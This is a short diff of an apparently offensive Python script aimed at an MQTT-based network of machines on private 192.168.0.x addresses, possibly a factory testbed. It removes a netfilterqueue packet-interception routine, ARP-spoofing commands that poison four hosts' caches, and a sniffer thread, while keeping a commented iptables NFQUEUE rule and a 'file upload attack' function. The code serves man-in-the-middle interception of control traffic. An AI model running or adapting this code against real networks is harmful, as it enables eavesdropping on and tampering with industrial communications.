@@ -28,11 +28,6 @@ order_color = None
 wp_id = None
 wp_location = None
 
-def broker():
-    ss = netfilterqueue.NetfilterQueue()
-    ss.bind(22, scratch_2.packet_process)
-    ss.run()
-
 
 def second_attack():
     logger.info("Starting file upload attack on 192.168.0.13")
@@ -699,17 +694,6 @@ def manual_on_message_trigger():
 
 # set IP tables to queue packets
 # ss = subprocess.getoutput('iptables -I FORWARD -j NFQUEUE --queue-num 22 -4 -p tcp --dport 1883')
-
-# send 1 arp spoof packet to poison broker arp cache
-ss = subprocess.getoutput('python3 arpspoofer.py -s 192.168.0.10 -t 192.168.0.13')
-ss = subprocess.getoutput('python3 arpspoofer.py -s 192.168.0.10 -t 192.168.0.12')  #hbw
-ss = subprocess.getoutput('python3 arpspoofer.py -s 192.168.0.10 -t 192.168.0.11')  #mpo
-ss = subprocess.getoutput('python3 arpspoofer.py -s 192.168.0.10 -t 192.168.0.14')  #sld
-
-logging.info("Successfully spoofed VGR with just 1 arp packet")
-
-thread_sniffer = threading.Thread(target=broker)
-thread_sniffer.start()
 
 for i in range(10):
         thread_manual_on_message_trigger = threading.Thread(target=manual_on_message_trigger)
